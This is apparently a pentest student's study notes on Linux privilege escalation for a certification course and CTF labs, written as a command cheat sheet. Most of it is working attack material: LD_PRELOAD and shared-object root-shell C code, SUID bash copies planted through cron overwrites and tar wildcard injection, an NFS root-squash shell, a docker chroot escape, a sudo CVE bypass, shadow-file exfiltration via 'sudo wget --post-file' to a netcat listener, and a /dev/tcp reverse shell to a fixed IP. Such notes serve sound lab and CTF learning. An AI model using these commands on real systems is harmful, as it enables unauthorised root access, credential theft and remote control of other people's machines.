---
title: "4 - Linux Privilege Escalation"
classes: single
header:  
  teaser: /assets/images/posts/pnpt/pnpt-teaser6.jpg
  overlay_image: /assets/images/main/header2.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Unleashing Power: A Dive into Linux Privilege Escalation"
description: "Exploring Linux Privesc Techniques: Kernel Exploits, SUDO, SUID, Scheduled Tasks, NFS Root Squashing and More"
categories:
  - notes
  - pnpt
tags:
  - beginner
  - pentest
  - linux
  - privesc
toc: true
---

**Resources**: 

TCM: https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources

Basic Linux Privilege Escalation:  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Linux Privilege Escalation:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
Checklist - Linux Privilege Escalation:  https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 
Sushant 747's Guide (Country dependant - may need VPN):  https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html



# Initial Enumeration

## System Enumeration

→ https://tryhackme.com/room/linuxprivescarena

```bash
uname -a
cat /proc/version
cat /etc/issue
lscpu
ps aux
```

> In the initial enum we wanna know the kernel version, architecture and processes.


## User Enumeration
```bash
whoami
id
sudo -l = to show what sudo permission we have
cat /etc/passwd | cut -d : -f 1 = to show only the users
cat /etc/shadow
cat /etc/group
history
```

> Here we wanna know who we are, what access do we have




## Network Enumeration
```bash
ifconfig or ip a
route or ip r
arp -a or ip neigh
netstat -ano
```

> What ports are open, what communication exists in the network, which network do we have access



## Password Hunting
```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
locate password or pass or pwd | more
find / -name authorized_keys or id_rsa 2>/dev/null
```

> look for password and sensitive files 




# Exploring Automated Tools




## Testing Tools

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum: https://github.com/rebootuser/LinEnum

Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

Linux Priv Checker: https://github.com/sleventyeleven/linuxprivchecker



# Escalation Path: Kernel Exploits



## Kernel escalation

Kernel Exploits: https://github.com/lucyoa/kernel-exploits

We can get version with:
```bash
uname -a
```

```
Go to google > exploitdb or searchsploit
```


# Permissions

## Stored Passwords
```bash
history
hunt down with linpeas, linenum
```

## Weak File Premissions
- Can we access something we should not? 
- Can we modify something?

Do we have access to /etc/shadow?
```bash
copy /etc/passwd and /etc/shadow and use 'unshadow <passFile shadowFile>' in kali
crack with hashcat -m 1800 or john
```

## SSH Keys
```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

we can *ssh-keygen* and add the public key to the target machine:

Or copy the *id_rsa* file from target and use:
```bash
<ssh -i file user@ip>
```



# Escalation Path: Sudo

Allow system administrator to delegate authority to run programs



## Shell Escaping

GTFOBins: https://gtfobins.github.io/
```bash
after sudo -l = to show files we can run with root privileges
go to GTFOBins to search the files we can execute
```

### Intended Functionality

There is no apache2 in gtfobins, but we can use this functionality to show shadow files:
```bash
sudo apache2 -f /etc/shadow
```

wget example: https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/


In target:
```bash
	sudo wget --post-file=/etc/shadow <kali ip:port> = We will send the shadow file to our PC, just listen with netcat to grab the file
```

In kali:
```bash
nc -lvnp <port>
```

### LD_PRELOAD
nano shell.c
```bash

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/fullpath/shell.so <something we can run as root>

```



## Sudo CVEs

### CVE-2019-14287

→ https://www.exploit-db.com/exploits/47502

```bash
sudo -l

user ALL=(ALL, !root) /bin/bash = user cannot execute /bin/bash

sudo -u#-1 /bin/bash
whoami
root
```

### CVE-2019-18634

→ https://github.com/saleemrashid/sudo-cve-2019-18634

```bash
cat /etc/sudoers
sudo -l
sudo -V
```

> In older machines, if pwfeedback is enable = asterisc appers when you type passwords
we can use an exploit to escalate that


# Escalation Path: SUID (set user ID)


	

## Search for suid files
```bash
find / -perm -u=s -type f 2>/dev/null
```


> If we have an upload file directory, but it does not accept php files
we can send to burp and fuzz the extension, to find an alternative, like php3,php4, phtml, etc


> Go to gtfobins if u find a file with SUID access





## Advanced SUID

### via Shared Object Injection
```bash
find / -perm -4000 -type f  -ls 2>/dev/null

strace <file> 2>&1 | grep -i -E "open|access|somethin else" = trace executable file / the grep just filters
```


> if u find a file in crontab or whatever that the system is executing as root, you can create a malicious file with the same name as that file, to make the system execute this instead;

nano malicious.c (btw nano > VIM )
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

gcc -shared -fPIC -o <path/output file> <path of file>

```

### via Binary Symlinks

Nginx Exploit: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

> For this to work, we need find the SUID bit set in /usr/bin/sudo file.
and vulnerable version of nginx

### via Environmental Variables
```bash
env 
# to show environmental variables

find / -perm -4000 -type f  -ls 2>/dev/null
```

File running with root privileges: 
```bash
service apache2 start 
# this is vulnerable cause is running without the full path for service
```

> Lets remember that the system grabs the full path of service via **env $PATH**

> With that in mind, we can make a malicious file and alter the $PATH variable to run a script.

```bash
echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /tmp/service.c'

gcc /tmp/service.c -o /tmp/service/
export PATH=/tmp:$PATH
```

File running with root but with full path:
```bash
/usr/sbin/service apache2 start

function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service 
# -f = refers to shell functions
```




# Escalation Path: Capabilities




## Resources
Linux Privilege Escalation using Capabilities: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

SUID vs Capabilities: https://mn3m.info/posts/suid-vs-capabilities/

Linux Capabilities Privilege Escalation: https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099

### Hunting for Capabilities 
Its similar to SUID, we can run files with privileges:
```bash
getcap -r / 2>/dev/null
# /usr/bin/python2.6 = cap_setuid+ep

/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```




# Escalation Path: Scheduled Tasks


## Look for Cron
There is others ways to visualize this, if u dont have permission to run crontab, seach for an alternative
example: 
```bash
/etc/init.d | /etc/cron* | /etc/sudoers | ls -al /etc/ | grep cron 

cat /etc/crontab
```

Look for Systemd Timers:
```bash
systemctl list-timers --all
```

### Escalation via Cron Paths

If the crontab is executing a file, go to your $PATH variable  to see which path u have access. 
in case u have access in any dir, lets go make something malicious to trick the crontab, to run our file

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

> wait the crontab to execute our file

we can ls the /tmp where the copy of the bash is located, when the suid bit is set, we are good to go
```bash
/tmp/bash -p
```

### Cron Wildcards
```bash
cat /etc/crontab
```

Lets say there is a file running in crontab, doing tar backup in a directory with (*) = that means all files inside that directory
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
chmod +s runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
# wait crontab to execute
/tmp/bash -p
```


### Cron File Overwrites

If we have privileges to write a file thats running by root in crontab, we just echo something malicious and wait
```bash
cat /etc/crontab

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /file/overwrite.sh
# wait crontab
/tmp/bash -p

```




## tips

> If you are not finding directories, perhaps u should look for subdomains

```bash
wfuzz -c -f sub-fighter -w <wordlist> -u <url> -H "Host: FUZZ.target.com" --hw 290 (exclude 290 errors)
```


crontab backing up a file with wildcard (*)
again:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > file.sh
chmod +x file.sh
```


# Escalation Path: NFS Root Squashing



## Identification of the vulnerability
```bash
cat /etc/exports
# output example=/tmp *(rw,sync,insecure,"no_root_squash",no_subtree_check)
```

> It means that the **/tmp** folder is shareable and can be mounted
and everything inside the mount gonna be run by root, so we can take advantage of that.


### Execution

From kali:
```bash
showmount -e <target ip>

mkdir /tmp/mountme
mount -o rw,vers=2 <target ip>:/tmp /tmp/mountme
```

> Now we put something malicious in the mounted folder

```bash
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/malicious.c

gcc /tmp/mountme/malicious.c -o /tmp/mountme/shell
chmod +s /tmp/mountme/shell
```

From the target machine:
```bash
cd /tmp
./shell
root
```



# Escalation Path: Docker


## Overview
```bash
run linpeas or linenum 
```

### Execution
gtfobins again: https://gtfobins.github.io/gtfobins/docker/

```bash
docker run -v /:/mnt --rm -it alpine(or bash) chroot /mnt sh
```


# CTFs
```
- Lazy Admin
- Anonymous
- Tomghost
- ConvertMyVideo
- pspy
- BrainPan1
- bfo
```

- ConvertMyVideo

```bash
${IFS} = using as space

bash -i >& /dev/tcp/10.17.27.169/7778 0>&1
```

- Found a file running by root with pspy64
- we could add a reverse shell and wait the connection

> the others I've done before.. so i'll just follow the videos

## Buffer Overflow 101 for brainPan1 CTF
```bash
- first FUZZ to find when the application gonna crash
- then: msf-pattern_create -l <number of crash>
- paste to the script
- copy the EIP value
- msf-pattern_offset -l <number of crash> -q <EIP number>
- grab the offset value
- we can send the buffer “A”*<offset value> + “B”*4  = the EIP should be 42424242
- grab badchars chars
- add to your script and u should follow the ESP dump to find the badchars
- or > Using Mona # check how to use Mona from PEH here 
# https://johnermac.github.io/notes/pnpt/peh/#exploit-development-using-python3-and-mona)
- take off the badchars of the script
- u should find the pointer with no protections
- invert the pointer
- generate msfvenom with the inverted pointer, open a listener to receive connection
- exploit!
```
